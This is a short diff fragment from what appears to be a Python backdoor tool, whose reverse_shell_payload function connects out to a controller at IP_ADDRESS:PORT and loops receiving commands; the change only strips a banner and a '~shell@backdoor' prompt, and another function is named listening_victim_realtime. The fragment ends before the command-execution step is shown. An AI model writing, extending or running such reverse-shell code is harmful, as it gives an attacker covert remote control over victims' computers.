@@ -257,10 +257,8 @@ def listening_victim_realtime():
 def reverse_shell_payload():
     s=socket.socket()
     s.connect((IP_ADDRESS,PORT))
-    s.send(banner.encode())
     while True:
         try:
-           s.send(b"~shell@backdoor ")
            cmd = s.recv(1024).decode("utf-8").strip()
            if not cmd:
                continue
